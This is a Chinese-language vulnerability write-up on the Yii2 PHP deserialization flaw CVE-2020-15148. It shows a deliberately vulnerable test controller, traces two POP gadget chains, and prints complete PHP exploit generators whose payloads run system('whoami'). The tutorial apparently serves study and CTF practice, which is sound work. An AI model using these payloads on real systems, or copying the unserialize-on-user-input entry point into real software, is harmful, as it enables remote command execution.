0x00 前言

Yii2 是一个高性能，基于组件的开源 PHP 框架，用于快速开发现代 Web 应用程序。与其他 PHP 框架类似，Yii2 实现了 MVC (Model-View-Controller) 设计模式并基于该模式组织代码。

由于其花样繁多的反序列化漏洞，近年来常见于各大CTF比赛和攻防演练中。

Yii Framework 2 在2020年9月14日发布的更新日志中公布了一个反序列化远程命令执行漏洞，编号为CVE-2020-15148。学习之旅，就从这里开始。

0x01 前期准备

Yii2 是基于MVC架构的 PHP 框架，所以要学习它的反序列化漏洞，需要对PHP基础、反序列化基础、类与对象以及命名空间的概念有所了解。

参考资料：

  • https://www.php.net/manual/zh/langref.php

  • https://www.php.net/manual/zh/language.oop5.php

  • https://www.php.net/manual/zh/language.namespaces.php

在了解完基础概念之后，需要进行测试环境搭建。

安装 Yii2 包括三个步骤：

1.从 github下载漏洞影响的版本的代码包，例如：yii-basic-app-2.0.37.tgz。
2.将下载的代码包解压到 Web 目录下。
3.修改 config/web.php 文件，给 cookieValidationKey 配置项添加一个密钥。

当然，也可以选择使用composer一步到位。

完成之后，访问web目录下的web路径，如果内容与下图一致，说明搭建成功。

之后需要添加一个反序列化漏洞的入口：

/controllers/TestController.php

<?phpnamespace app\controllers;
use Yii;use yii\web\Controller;
class TestController extends Controller{    public function actionIndex(){        $name = Yii::$app->request->get('test');        return unserialize(base64_decode($name));        }
}

之后访问/web/index.php?r=test/index&test=czozOiJhYWEiOw==，进行测试即可。

0x02 漏洞分析及复现

分析反序列化漏洞时，需要找到漏洞起点，可以从官方的更新日志中找到线索。
https://github.com/yiisoft/yii2/blob/master/framework/CHANGELOG.md

从该日志中可以发现，CVE-2020-15148漏洞的影响文件是yii2/db/BatchQueryResult.php。

之后我们可以从github的commit中找到对应日期的版本，进行对比分析。

选择tag是2.0.38之后，可发现：

https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99?diff=split

在该版本的更新中，在yii\db\BatchQueryResult类中添加了一个__wakeup()魔术方法，禁止了该类的反序列化，这无疑也佐证了我们的判断。

所以，漏洞分析的起点，就从yii\db\BatchQueryResult开始。

当然，在开始之前，需要先简单列一下常见的魔术方法。

魔术方法触发条件
__wakeup()使用unserialize时触发，常用于反序列化漏洞的起点，优先级高于__destruct()
__sleep()使用serialize时触发
__construct()对象被创建时触发
__destruct()对象被销毁时触发，常用于反序列化漏洞的起点
__call()在对象上下文中调用不可访问的方法时触发
__get()用于从不可访问的属性读取数据
__set()用于将数据写入不可访问的属性
__toString()把类当作字符串使用时触发
__invoke()当脚本尝试将对象调用为函数时触发

最常见的反序列化起点无非就是__destruct()或__wakeup()，其他的魔术方法作为构成POP链的一环。了解这些之后，我们开始正式分析漏洞。

首先打开文件，/vendor/yiisoft/yii2/db/BatchQueryResult.php，删除多余的代码和注释后，如下：

<?phpnamespace yii\db;
use yii\base\BaseObject;
class BatchQueryResult extends BaseObject implements \Iterator{
    private $_dataReader;
    public function __destruct(){        $this->reset();    }
    public function reset(){        if ($this->_dataReader !== null) {            $this->_dataReader->close();        }    }

在经过反序列化时，通过__destruct魔术方法，触发了自身的reset方法，此时_dataReader变量是可控的。reset方法进行调用了_dataReader的close方法。

这时候会有两种情况：

1._dataReader对象没有close方法，于是触发__call()魔术方法，从__call()方法触发其他危险函数。

2._dataReader对象存在close方法，于是触发close方法，从close方法触发其他危险函数。

这里的危险函数是泛指一切类似于call_user_func之类的可直接或间接执行命令的函数。从这里，就可以分出两条POP链，我们先从第一种情况开始说起。

POP1

首先寻找含有__call()魔术方法的类，通过工具搜索关键字function __call(，共找到14个文件。

由于close方法没有传递参数，所以__call()魔术方法也没有传递参数，所以危险函数的参数，需要从类的本身寻找。接下来需要从这些__call()魔术方法中，寻找符合要求的类。

在排除掉大部分无函数执行的类之后，初步筛选了5 个类。

/vendor/fzaninotto/faker/src/Faker/UniqueGenerator.php/vendor/fzaninotto/faker/src/Faker/Generator.php/vendor/fzaninotto/faker/src/Faker/ValidGenerator.php/vendor/guzzlehttp/psr7/src/StreamDecoratorTrait.php/vendor/yiisoft/yii2/base/Component.php

继续深入筛选发现，Component.php的函数参数不可控；StreamDecoratorTrait.php使用trait定义，无法被实例化；但是在ValidGenerator.php中发现call_user_func_array(array($this->generator, $name), $arguments);代码，通过代码进行简单测试。

<?php
$generator='aaa';$name='';$arguments=[];
call_user_func_array(array($generator, $name), $arguments);

运行之后发现存在警告：
Warning: call_user_func_array() expects parameter 1 to be a valid callback, class 'aaa' not found in C:\Users\87563\Desktop\2.php on line 7。

根据警告信息去检索了call_user_func_array的官方说明，根据：
https://www.php.net/manual/zh/function.call-user-func-array.php
https://www.php.net/manual/zh/language.types.callable.php

发现，call_user_func_array和call_user_func函数中的$callback参数支持已实例化的对象作为数组传递，一个已实例化的 object 的方法被作为 array 传递，下标 0 包含该 object，下标 1 包含方法名。

也就是说，我们可以通过执行class中的方法，例如：

<?php
$generator=new Test();$name='test_func';$arguments=[];
call_user_func_array(array($generator, $name), $arguments);

这样就可以执行Test类中的test_func函数。

但在ValidGenerator.php中，class不可控，方法不可控，UniqueGenerator.php也同样如此，于是排除掉。

最终，只剩下了Generator.php，进行深入分析，代码审计。在删除掉多余代码后，简单改变一下代码顺序，就变成了：

<?php
namespace Faker;
class Generator{    protected $formatters = array();
    public function __call($method, $attributes){        return $this->format($method, $attributes);    }
    public function format($formatter, $arguments = array()){        return call_user_func_array($this->getFormatter($formatter), $arguments);    }
    public function getFormatter($formatter){        if (isset($this->formatters[$formatter])) {            return $this->formatters[$formatter];        }    }}
__call()魔术方法会调用自身的format方法，format方法又会调用call_user_func_array，然后会触发getFormatter方法进行一个简单的判断。因为我们是通过BatchQueryResult.php中$this->_dataReader->close();来触发的__call()，所以这时候$formatter的值是close，判断逻辑是如果存在$this->formatters['close']，那么就返回它的值。
简单来说就是，可以通过控制$this->formatters['close']，来选择调用不同的函数，当然必需是无参数的函数，例如phpinfo()。
至此，我们可以简单的构造一个POP链：
yii\db\BatchQueryResult::__destruct()->reset()->close()->Faker\Generator::__call()->phpinfo()
简单写一下EXP的代码：
<?php
namespace Faker {

    class Generator    {        protected $formatters;
        public function __construct(){            $this->formatters['close'] = 'phpinfo';        }    }}namespace yii\db{
    use Faker\Generator;
    class BatchQueryResult{        private $_dataReader;        public function __construct(){            $this->_dataReader=new Generator();        }    }}namespace{
    use yii\db\BatchQueryResult;
    echo base64_encode(serialize(new BatchQueryResult()));}?>
使用payload测试可发现，已经成功执行了phpinfo。
但是这样只能执行无参数的函数，距离RCE还有一段距离。
在之前，我们发现call_user_func_array函数中的$callback参数的特性，可执行其他类中的函数，这时候可以查找在Yii2自身代码中，是否有可以代码执行的点，例如call_user_func。并且，要求是两个参数均来自于类本身，并且可控。
通过工具搜索关键字call_user_func($this->，共找到110个文件，人工筛选后发现存在两个文件符合要求，分别是/basic/vendor/yiisoft/yii2/rest/CreateAction.php和/basic/vendor/yiisoft/yii2/rest/IndexAction.php。
而且调用的函数也是无参数调用的：
那么，现在的POP链就变成了：
yii\db\BatchQueryResult::__destruct()->reset()->close()->Faker\Generator::__call()->format()->call_user_func_array()->yii\rest\IndexAction::run->call_user_func()->system('whoami')
对应是EXP是：
<?php
namespace yii\rest{    class IndexAction{        public $checkAccess;        public $id;        public function __construct(){            $this->checkAccess = 'system';            $this->id = 'whoami';         }    }}namespace Faker {
    use yii\rest\IndexAction;
    class Generator{        protected $formatters;
        public function __construct(){            $this->formatters['close'] = [new IndexAction(), 'run'];        }    }}namespace yii\db{
    use Faker\Generator;
    class BatchQueryResult{        private $_dataReader;        public function __construct(){            $this->_dataReader=new Generator();        }    }}namespace{
    use yii\db\BatchQueryResult;
    echo base64_encode(serialize(new BatchQueryResult()));}

POP2
现在讨论下第二种情况，寻找存在close()函数的类，当然还是要通过它去调用危险函数的。通过工具搜索关键字function close()，共找到12个文件，人工筛选后发现，只剩下/basic/vendor/yiisoft/yii2/web/DbSession.php符合要求。
在对代码进行简单整理之后，各个类直接存在继承关系，这里就直接放在一起了，代码如下：
<?phpnamespace yii\web;
class DbSession extends MultiFieldSession{    public function close(){        if ($this->getIsActive()) {            $this->fields = $this->composeFields();        }    }
}
namespace yii\web;
abstract class MultiFieldSession extends Session{    public $writeCallback;
    protected function composeFields($id = null, $data = null){        $fields = $this->writeCallback ? call_user_func($this->writeCallback, $this) : [];    }}
namespace yii\web;
class Session extends Component implements \IteratorAggregate, \ArrayAccess, \Countable{
    public function getIsActive(){        return session_status() === PHP_SESSION_ACTIVE;    }}
close()函数触发后会进行getIsActive()的判断，如果条件成立，那么会就调用composeFields()，然后会触发call_user_func函数，并且第一个参数writeCallback可控，之后就可以同样利用CreateAction或者IndexAction了。
getIsActive()的返回值与session有关，经测试，当开启session时，返回值为True，所以只要是正常网页访问，就永远为True:
<?phpsession_start();var_dump(session_status() === PHP_SESSION_ACTIVE);
新的POP链是：
yii\db\BatchQueryResult::__destruct() -> reset() -> close()->yii\web\DbSession::close() -> MultiFieldSession::composeFields() -> call_user_func()->yii\rest\IndexAction::run() -> call_user_func() -> system('whoami')
EXP如下：
<?phpnamespace yii\rest{    class IndexAction{        public $checkAccess;        public $id;
        public function __construct(){            $this->checkAccess = 'system';            $this->id = 'whoami'; 
        }    }}
namespace yii\web{    use yii\rest\IndexAction;
    class DbSession{        public $writeCallback;        function __construct(){            $this->writeCallback = [new IndexAction(), 'run'];        }    }
}
namespace yii\db{    use yii\web\DbSession;
    class BatchQueryResult{        private $_dataReader;
        public function __construct(){            $this->_dataReader = new DbSession();        }    }}
namespace{    $payload = new yii\db\BatchQueryResult();    echo base64_encode(serialize($payload));}?>
